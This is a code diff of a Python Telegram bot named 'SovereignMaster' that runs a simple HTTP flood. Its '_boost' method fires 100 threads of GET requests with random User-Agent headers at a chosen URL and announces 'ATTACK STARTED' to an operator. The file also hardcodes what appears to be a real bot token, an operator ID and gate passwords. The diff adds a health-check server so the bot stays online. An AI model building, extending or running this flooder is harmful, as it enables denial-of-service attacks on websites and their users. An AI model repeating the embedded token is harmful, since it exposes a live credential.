@@ -1,19 +1,30 @@
 import os, time, requests, threading, random
+from http.server import HTTPServer, BaseHTTPRequestHandler
 
 TOKEN = "8536346083:AAGYUDR6cd7hI9_41_gNbQdREbBb6Dn_9v4"
 MASTER_ID = 1938591484
 
+class HealthCheck(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"SYSTEM_ALIVE")
+
+def run_health_check():
+    server = HTTPServer(('0.0.0.0', 10000), HealthCheck)
+    server.serve_forever()
+
 class SovereignMaster:
     def __init__(self, t):
         self.t, self.f, self.r, self.u = t, {}, False, f"https://api.telegram.org/bot{t}"
-        self._s(MASTER_ID, "SYSTEM ONLINE")
+        self._s(MASTER_ID, "🔱 SYSTEM ONLINE")
 
     def _s(self, c, x):
         try: requests.post(f"{self.u}/sendMessage", json={'chat_id': c, 'text': x})
         except: pass
 
     def _boost(self, url):
-        self._s(MASTER_ID, "ATTACK STARTED")
+        self._s(MASTER_ID, "🚀 ATTACK STARTED")
         for _ in range(100): 
             threading.Thread(target=lambda: requests.get(url, headers={'User-Agent': str(random.random())}), daemon=True).start()
 
@@ -34,12 +45,12 @@ class SovereignMaster:
                         if "ariful islam pappu 2000" in tx.lower():
                             self._s(uid, "IDENTITY CONFIRMED. ENTER SECOND LOGIC.")
                             self.f[uid] = 2
-                        else: self._s(uid, "WRONG PASSWORD.")
+                        else: self._s(uid, "WRONG.")
                     elif st == 2:
                         if "জামালপুর" in tx:
                             self._s(uid, "LEVEL 2 CLEARED. ENTER MASTER KEY.")
                             self.f[uid] = 3
-                        else: self._s(uid, "INVALID DATA.")
+                        else: self._s(uid, "INVALID.")
                     elif st == 3:
                         if tx == "Aip2k3052":
                             self.f[uid] = "ROOT"; self.r = True
@@ -51,5 +62,6 @@ class SovereignMaster:
             time.sleep(1)
 
 if __name__ == "__main__":
+    threading.Thread(target=run_health_check, daemon=True).start()
     SovereignMaster(TOKEN).listen()
     
